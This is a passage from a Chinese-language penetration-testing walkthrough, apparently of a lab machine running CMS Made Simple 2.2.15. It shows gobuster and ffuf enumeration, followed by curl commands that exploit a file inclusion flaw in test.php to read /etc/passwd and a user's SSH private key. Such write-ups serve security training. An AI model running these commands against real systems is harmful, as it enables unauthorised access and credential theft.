## **2、渗透测试**

### **2.1 站点渗透**

#### **1.访问WEB站点**

发现存在一个账号qiu

![](../Images/031fcada4db7e9ec6e2b16be2bf34253.png)

#### **2.查看CMS版本**

查看CMS为 CMS Made Simple ，版本为2.2.15

![](../Images/f5f2580bfa997018341e5589bd3e7527.png)

搜索漏洞，发现XSS和文件上传，需要认证成功后才能执行

![](../Images/234ed0194dce5d145e298874b0c0eb15.png)

#### **3.使用gobuster进行爆破**

```
gobuster dir -u http://192.168.207.131 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .html,.php,.txt
```

![](../Images/4183cbad1b2e74e54fe551377f9d3a36.png)

#### **4.测试访问test.php**

提示需要在get请求中传入参数

![](../Images/716549cb27334df811823fda851c325a.png)

测试需要传参的内容，获取到参数为file

```
ffuf -c -w /usr/share/seclists/Discovery/Web-Content/common.txt -u 'http://192.168.207.131/test.php?FUZZ=/etc/passwd' -fs 80
```

![](../Images/f39ab68825b9d2eba16fea82f49c794e.png)

#### **5.通过file参数获取密码**

```
curl http://192.168.207.131/test.php?file=/etc/passwd
```

查看存在qiu账号，并且允许登录

![](../Images/bb639130851f1eeeb6bd45bfad55127e.png)

#### **6.获取qiu账号的登录密钥**

```
curl http://192.168.207.131/test.php?file=/home/qiu/.ssh/id\_rsa
```

![](../Images/ab1f86fbd5a67a7a7239222c479c2055.png)

#### **7.保存密钥文件并修改权限**

```


curl http://192.168.207.131/test.php?file=/home/qiu/.ssh/id\_rsa >> id\_rsa
```

![](../Images/490c8396c3e4356ca44daa0652d8fb65.png)
